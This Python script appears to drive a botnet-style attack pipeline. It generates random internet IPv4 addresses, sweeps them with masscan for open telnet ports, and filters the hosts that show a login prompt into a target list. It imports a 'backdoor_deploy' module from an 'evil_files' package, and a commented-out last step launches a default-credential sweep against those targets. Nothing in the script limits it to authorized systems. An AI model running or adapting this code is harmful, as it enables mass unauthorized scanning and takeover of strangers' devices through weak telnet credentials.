from helper_tools.ip_gen_tool_v2 import generate_ips 
from helper_tools.json_extract_to_txt import init_json_to_txt
from exploit_scan_tools.telnet_scan import main as telnet_main
from helper_tools.csv_clean import cleanCSV
from helper_tools.csv_to_txt import toTXT

from evil_files.backdoor_deploy import initDeploy
import subprocess

IP_AMOUNT = 20000

# Generate random addresses in the IPv4 space
print("Generating IP addresses...")
generate_ips(IP_AMOUNT)

# Run the masscan tool to check if the IP address are actual hosts
print("Running masscan...")
masscan_command = [
    "sudo",
    "masscan",
    "-iL", "ip_data_files/generated_ips.txt",
    "-p23",
    "--rate", "10000",
    "--wait", "2",
    "-oJ", "ip_data_files/valid_ips.json"
]

subprocess.run(masscan_command, check=True)

# Extract the valid hosts into a txt file
print("Extracting valid IPs to text file...")
init_json_to_txt()

# Scan for telnet login prompts and save the results as a csv file
print("Running Telnet login prompt scan...")
path = "ip_data_files/target_ips.txt"
telnet_main(path)

# Clean up the csv file by removing hosts who doesn't return a login prompt
cleanCSV("ip_data_files/results.csv")

# Convert the filtered csv results into a text file
toTXT("ip_data_files/filtered_results.csv")

# Initiate the default credential sweep
#initDeploy("final_target_ips.txt")











